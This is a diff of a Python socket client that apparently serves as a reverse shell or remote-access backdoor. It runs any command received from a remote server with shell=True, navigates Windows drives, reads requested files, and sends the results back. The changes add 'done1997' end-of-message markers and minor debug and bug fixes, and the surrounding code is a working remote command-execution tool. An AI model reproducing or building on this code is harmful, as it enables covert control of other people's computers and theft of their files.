@@ -24,7 +24,7 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
         print("to_do:", to_do)
         if to_do.find("exit1997") != -1:
             print("time to exit")
-            s.send(b"bye")
+            s.send(b"bye done1997")
             break
         elif to_do[:3] == "dld":
             try:
@@ -40,13 +40,13 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
             except:
                 file_content = "download err"
             print("dld file content:", file_content)
-            s.send(file_content.encode("gb2312"))
+            s.send((file_content + "\ndone1997").encode("gb2312"))
 
         elif to_do[:2] == "cd" or to_do[:2].lower() == "a:" or to_do[:2].lower() == "c:" or to_do[:2].lower() == "d:" or to_do[:2].lower() == "e:" or to_do[:2].lower() == "f:" or to_do[:2].lower() == "g:":
             if nav == "":
                 nav = to_do
                 loc = get_loc(nav)
-                s.send(("now your location is: " + loc).encode("gb2312"))
+                s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312"))
             else:
             	try:
             		if nav == "":
@@ -55,24 +55,26 @@ if s.recv(1024).decode("utf-8") == "you connect successfully!":
             		    loc = get_loc(nav + " && " + to_do)
             		nav = nav + " && " + to_do
             		print("now your location is: " + loc)
-            		s.send(("now your location is: " + loc).encode("gb2312"))
+            		s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312"))
             	except:
             		print("cd err")
-            		s.send(b"cd err")
+            		s.send(b"cd err done1997")
         else:
             try:
                 if nav == "":
                     output = subprocess.check_output(to_do, shell = True)
                 else:
+                    #print("echo test")
+                    #print("nav", nav)
+                    #print("to_do", to_do)
                     output = subprocess.check_output(nav + " && " + to_do, shell = True)
             except:
                 output = b"run cmd err"
-            if output == "":
+            if output == b"":
                 output = b"return value is empty string, so I return this"
-            print(output.decode("gb2312"))
-            s.send(output.decode("gb2312").encode("gb2312"))
+            print("output:", output.decode("gb2312"))
+            s.send((output + b"\ndone1997").decode("gb2312").encode("gb2312"))
             
 
 s.close()
 print("connection closed")
-    
